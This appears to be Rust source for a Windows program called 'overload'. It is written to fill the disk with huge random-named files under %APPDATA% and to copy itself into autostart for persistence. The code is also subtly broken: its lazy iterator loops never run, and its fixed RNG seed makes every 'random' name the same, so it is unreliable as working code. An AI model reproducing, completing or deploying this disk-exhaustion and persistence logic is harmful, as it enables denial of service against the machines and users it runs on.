use auto_launch::AutoLaunch;
use rand::{Rng, SeedableRng, rngs::SmallRng};
use std::{
    env,
    fs::{OpenOptions, copy, create_dir_all},
    io::Write,
};

const MAX_PATH_LENGTH: usize = 255;
const MAX_TEXT_LENGTH: usize = 4294967295;
const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789~@#$%^-_(){}'`";

pub fn join_paths(f: &str, s: &str) -> String {
    format!(r#"{}\{}"#, f, s)
}

async fn random_string(length: usize) -> String {
    let mut rng = SmallRng::seed_from_u64(1);
    (0..length)
        .map(|_| {
            let idx = rng.random_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

async fn random_body(file_path: &str) {
    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(file_path)
        .expect("Failed create file");

    let mut rng = SmallRng::seed_from_u64(1);
    let _ = (0..MAX_TEXT_LENGTH).map(|_| {
        let _ = (0..MAX_TEXT_LENGTH).map(|_| {
            let char = CHARSET[rng.random_range(0..CHARSET.len())] as char;
            write!(file, "{}", char).expect("Failed write to file");
        });
        writeln!(file).expect("Failed write to file");
    });
}

pub async fn random_file() {
    let dir = join_paths(&env::var("appdata").expect(""), "overload");
    create_dir_all(&dir).expect("Failed create dir");

    let path = join_paths(&dir, &random_string(MAX_PATH_LENGTH).await);
    random_body(&path).await;
}

pub fn self_copy(file_path: &str) {
    copy("overload.exe", file_path).expect("Failed to copy");

    AutoLaunch::new("overload", file_path, &["-c"])
        .enable()
        .expect("Failed to autostart");
}
